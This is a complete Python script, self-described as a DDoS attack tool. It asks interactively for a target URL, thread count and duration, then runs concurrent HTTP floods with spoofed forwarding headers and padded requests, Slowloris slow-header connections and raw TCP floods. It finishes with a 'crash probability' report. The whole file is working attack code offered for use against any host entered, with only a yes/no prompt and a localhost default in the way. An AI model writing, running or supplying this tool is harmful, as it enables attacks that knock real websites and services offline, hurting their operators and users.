#!/usr/bin/env python3
"""
ddos_rapid_strike_interactive.py - Multi-layer DDoS attack tool with interactive URL input
"""

import asyncio
import aiohttp
import random
import time
import socket
import os
import sys
from datetime import datetime
from urllib.parse import urlparse

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORS = True
except ImportError:
    COLORS = False
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''

class DDoS_RapidStrike:
    def __init__(self, target_url, threads=500, duration=60):
        self.target = target_url.rstrip('/')
        self.threads = threads
        self.duration = duration
        self.start_time = None
        self.total_sent = 0
        self.success_count = 0
        self.fail_count = 0
        self.running = True
        
        parsed = urlparse(self.target)
        self.target_host = parsed.hostname or 'localhost'
        self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.target_scheme = parsed.scheme or 'http'
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36"
        ]
        
        self.slow_headers = [
            "X-Forwarded-For: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1",
            "X-Remote-IP: 127.0.0.1",
            "X-Remote-Addr: 127.0.0.1",
            "X-Client-IP: 127.0.0.1",
            "X-Host: 127.0.0.1",
            "X-Forwarded-Host: 127.0.0.1"
        ]
        
        self.attack_paths = [
            "/", "/wp-admin", "/wp-login.php", "/admin", "/login",
            "/api/v1", "/api/v2", "/graphql", "/query", "/search",
            "/products", "/users", "/auth", "/oauth", "/callback",
            "/webhook", "/socket.io", "/ws", "/stream", "/upload",
            "/download", "/backup", "/config", "/settings", "/profile",
            "/account", "/order", "/payment", "/checkout"
        ]
        
        self.query_params = [
            "?id=1", "?page=1", "?sort=asc", "?filter=all",
            "?include=metadata", "?limit=1000", "?offset=0",
            "?search=a"*1000, "?q=" + "a"*2000,
            "?callback=jsonp", "?_=" + str(int(time.time())),
            "?timestamp=" + str(int(time.time()))
        ]
        
    def _cprint(self, text, color="WHITE", end="\n"):
        if COLORS:
            colors = {
                "RED": Fore.RED, "GREEN": Fore.GREEN, "YELLOW": Fore.YELLOW,
                "BLUE": Fore.BLUE, "MAGENTA": Fore.MAGENTA, "CYAN": Fore.CYAN,
                "WHITE": Fore.WHITE
            }
            print(f"{colors.get(color, Fore.WHITE)}{text}{Fore.RESET}", end=end)
        else:
            print(text, end=end)
            
    def _banner(self):
        banner = """
██████╗░██████╗░░█████╗░░██████╗  ██████╗░░█████╗░██████╗░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗
██║░░██║██████╔╝███████║╚█████╗░  ██████╔╝███████║██████╔╝██║██║░░██║
██║░░██║██╔══██╗██╔══██║░╚═══██╗  ██╔══██╗██╔══██║██╔══██╗██║██║░░██║
██████╔╝██║░░██║██║░░██║██████╔╝  ██║░░██║██║░░██║██║░░██║██║██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░

░██████╗████████╗██████╗░██╗██╗░░██╗███████╗
██╔════╝╚══██╔══╝██╔══██╗██║██║░██╔╝██╔════╝
╚█████╗░░░░██║░░░██████╔╝██║█████═╝░█████╗░░
░╚═══██╗░░░██║░░░██╔══██╗██║██╔═██╗░██╔══╝░░
██████╔╝░░░██║░░░██║░░██║██║██║░╚██╗███████╗
╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚══════╝
"""
        self._cprint(banner, "RED")
        
    def _get_url_interactive(self):
        """Prompt user for URL interactively"""
        self._cprint("\n" + "="*60, "CYAN")
        self._cprint("[TARGET INPUT]", "YELLOW")
        self._cprint("="*60, "CYAN")
        self._cprint("\nEnter target URL (e.g., http://example.com or 192.168.1.100:8080)", "WHITE")
        self._cprint("Press Enter to use default: http://127.0.0.1:8080", "CYAN")
        print()
        
        url_input = input(f"{Fore.GREEN}➜ {Fore.RESET}URL: ").strip()
        
        if not url_input:
            url_input = "http://127.0.0.1:8080"
            self._cprint(f"\n[+] Using default: {url_input}", "YELLOW")
        
        if not url_input.startswith(('http://', 'https://')):
            url_input = f"http://{url_input}"
            
        self.target = url_input.rstrip('/')
        parsed = urlparse(self.target)
        self.target_host = parsed.hostname or 'localhost'
        self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.target_scheme = parsed.scheme or 'http'
        
        self._cprint(f"\n[✓] Target set: {self.target}", "GREEN")
        return self.target
        
    def _get_threads_interactive(self):
        """Prompt user for thread count"""
        self._cprint("\n" + "="*60, "CYAN")
        self._cprint("[THREAD CONFIG]", "YELLOW")
        self._cprint("="*60, "CYAN")
        self._cprint("\nNumber of concurrent threads (higher = more powerful)", "WHITE")
        self._cprint(f"Default: {self.threads} (recommended for 60s crash)", "CYAN")
        print()
        
        threads_input = input(f"{Fore.GREEN}➜ {Fore.RESET}Threads: ").strip()
        
        if threads_input.isdigit():
            self.threads = int(threads_input)
            self._cprint(f"\n[✓] Threads set: {self.threads}", "GREEN")
        else:
            self._cprint(f"\n[+] Using default threads: {self.threads}", "YELLOW")
            
        return self.threads
        
    def _get_duration_interactive(self):
        """Prompt user for attack duration"""
        self._cprint("\n" + "="*60, "CYAN")
        self._cprint("[DURATION CONFIG]", "YELLOW")
        self._cprint("="*60, "CYAN")
        self._cprint("\nAttack duration in seconds (60s = rapid strike)", "WHITE")
        self._cprint(f"Default: {self.duration}s", "CYAN")
        print()
        
        duration_input = input(f"{Fore.GREEN}➜ {Fore.RESET}Duration (s): ").strip()
        
        if duration_input.isdigit():
            self.duration = int(duration_input)
            self._cprint(f"\n[✓] Duration set: {self.duration}s", "GREEN")
        else:
            self._cprint(f"\n[+] Using default duration: {self.duration}s", "YELLOW")
            
        return self.duration
        
    def _confirm_attack(self):
        """Show attack summary and get confirmation"""
        self._cprint("\n" + "="*60, "MAGENTA")
        self._cprint("[ATTACK SUMMARY]", "YELLOW")
        self._cprint("="*60, "MAGENTA")
        self._cprint(f"  Target    : {self.target}", "WHITE")
        self._cprint(f"  Host      : {self.target_host}:{self.target_port}", "WHITE")
        self._cprint(f"  Threads   : {self.threads}", "WHITE")
        self._cprint(f"  Duration  : {self.duration}s", "WHITE")
        self._cprint(f"  Mode      : Multi-layer (HTTP + Slowloris + TCP)", "CYAN")
        self._cprint("="*60, "MAGENTA")
        
        self._cprint("\n[!] WARNING: This will send high-volume traffic", "RED")
        self._cprint("[?] Launch attack? (y/N): ", "YELLOW", end="")
        
        confirm = input().strip().lower()
        return confirm in ['y', 'yes']
        
    async def _http_attack(self, session, pbar):
        """HTTP flood attack"""
        try:
            path = random.choice(self.attack_paths)
            query = random.choice(self.query_params) if random.random() > 0.5 else ""
            url = f"{self.target}{path}{query}"
            
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive' if random.random() > 0.5 else 'close',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Referer': random.choice([
                    'https://google.com/', 'https://bing.com/',
                    'https://yahoo.com/', 'https://duckduckgo.com/',
                    self.target
                ]),
                'Origin': self.target,
                'Content-Type': 'application/x-www-form-urlencoded' if random.random() > 0.5 else 'application/json'
            }
            
            if random.random() > 0.7:
                headers[random.choice([
                    'X-Forwarded-For', 'X-Originating-IP', 'X-Remote-IP',
                    'X-Remote-Addr', 'X-Client-IP', 'X-Host'
                ])] = '127.0.0.1'
            
            method = random.choices(
                ['GET', 'POST', 'HEAD', 'OPTIONS'],
                weights=[0.4, 0.3, 0.2, 0.1]
            )[0]
            
            data = None
            if method == 'POST':
                data = {random.choice(['data', 'payload', 'json']): 'a' * random.randint(100, 5000)}
            
            timeout = aiohttp.ClientTimeout(total=3, connect=1, sock_read=2)
            
            async with session.request(
                method, url, 
                headers=headers, 
                data=data if method == 'POST' else None,
                timeout=timeout,
                ssl=False
            ) as resp:
                self.total_sent += 1
                if 200 <= resp.status < 400:
                    self.success_count += 1
                else:
                    self.fail_count += 1
                pbar.update(1)
                
        except:
            self.fail_count += 1
            self.total_sent += 1
            pbar.update(1)
            
    async def _slow_attack(self):
        """Slowloris attack"""
        try:
            reader, writer = await asyncio.open_connection(
                self.target_host, 
                self.target_port if self.target_port != 443 else 80,
                ssl=False
            )
            
            request = f"GET /{random.choice(self.attack_paths)} HTTP/1.1\r\n"
            request += f"Host: {self.target_host}\r\n"
            request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
            request += "Connection: keep-alive\r\n"
            request += "Cache-Control: no-cache\r\n"
            
            writer.write(request.encode())
            await asyncio.sleep(random.uniform(0.5, 2.0))
            
            for _ in range(random.randint(5, 15)):
                header = random.choice(self.slow_headers)
                writer.write(f"{header}\r\n".encode())
                await asyncio.sleep(random.uniform(0.5, 2.0))
            
            await asyncio.sleep(30)
            writer.close()
            await writer.wait_closed()
            
        except:
            pass
            
    async def _tcp_attack(self):
        """TCP flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.bind(('0.0.0.0', random.randint(1024, 65535)))
            sock.connect((self.target_host, self.target_port))
            sock.send(os.urandom(random.randint(64, 1024)))
            sock.close()
        except:
            pass
            
    async def _rave_core(self):
        """Main attack loop"""
        self.start_time = time.time()
        
        connector = aiohttp.TCPConnector(
            limit=self.threads * 2,
            limit_per_host=self.threads * 2,
            ttl_dns_cache=0,
            force_close=True,
            enable_cleanup_closed=True
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            from tqdm.asyncio import tqdm
            pbar = tqdm(
                total=None,
                desc="[ATTACK]",
                bar_format="{l_bar}{bar}| {n_fmt} req",
                colour='red'
            )
            
            http_tasks = []
            slow_tasks = []
            tcp_tasks = []
            
            for _ in range(self.threads):
                http_tasks.append(asyncio.create_task(self._http_attack(session, pbar)))
            
            for _ in range(self.threads // 10):
                slow_tasks.append(asyncio.create_task(self._slow_attack()))
            
            for _ in range(self.threads // 5):
                tcp_tasks.append(asyncio.create_task(self._tcp_attack()))
            
            while time.time() - self.start_time < self.duration:
                await asyncio.sleep(0.1)
                http_tasks = [t for t in http_tasks if not t.done()]
                if len(http_tasks) < self.threads:
                    for _ in range(self.threads - len(http_tasks)):
                        http_tasks.append(asyncio.create_task(self._http_attack(session, pbar)))
            
            self.running = False
            for task in http_tasks + slow_tasks + tcp_tasks:
                if not task.done():
                    task.cancel()
            
            await asyncio.gather(*http_tasks, return_exceptions=True)
            await asyncio.gather(*slow_tasks, return_exceptions=True)
            await asyncio.gather(*tcp_tasks, return_exceptions=True)
            pbar.close()
            
    async def launch(self):
        """Launch attack with interactive setup"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self._banner()
        
        self._get_url_interactive()
        self._get_threads_interactive()
        self._get_duration_interactive()
        
        if not self._confirm_attack():
            self._cprint("\n[!] Attack cancelled", "YELLOW")
            return
            
        self._cprint("\n[*] Launching attack...", "GREEN")
        self._cprint("[*] Press Ctrl+C to abort", "YELLOW")
        self._cprint("="*60, "CYAN")
        print()
        
        try:
            await self._rave_core()
        except KeyboardInterrupt:
            self._cprint("\n[!] Attack interrupted", "YELLOW")
        except Exception as e:
            self._cprint(f"\n[-] Error: {e}", "RED")
            
        elapsed = time.time() - self.start_time
        self._cprint("\n" + "="*60, "CYAN")
        self._cprint("ATTACK COMPLETE - RAPID STRIKE REPORT", "RED")
        self._cprint("="*60, "CYAN")
        self._cprint(f"  Target: {self.target}", "WHITE")
        self._cprint(f"  Duration: {elapsed:.2f}s", "WHITE")
        self._cprint(f"  Total Requests: {self.total_sent}", "WHITE")
        self._cprint(f"  Success: {self.success_count}", "GREEN")
        self._cprint(f"  Failed: {self.fail_count}", "RED")
        self._cprint(f"  Attack Rate: {self.total_sent / elapsed:.1f} req/s", "YELLOW")
        
        crash_prob = min(100, (self.total_sent / 5000) * 100)
        self._cprint(f"  Crash Probability: {crash_prob:.1f}%", "MAGENTA")
        
        if crash_prob > 80:
            self._cprint("  [✓] CRASH LIKELY", "RED")
        elif crash_prob > 50:
            self._cprint("  [!] Moderate success", "YELLOW")
        else:
            self._cprint("  [x] Need more resources", "WHITE")
            
        self._cprint("="*60, "CYAN")

def main():
    attack = DDoS_RapidStrike("http://127.0.0.1:8080")
    asyncio.run(attack.launch())

if __name__ == "__main__":
    main()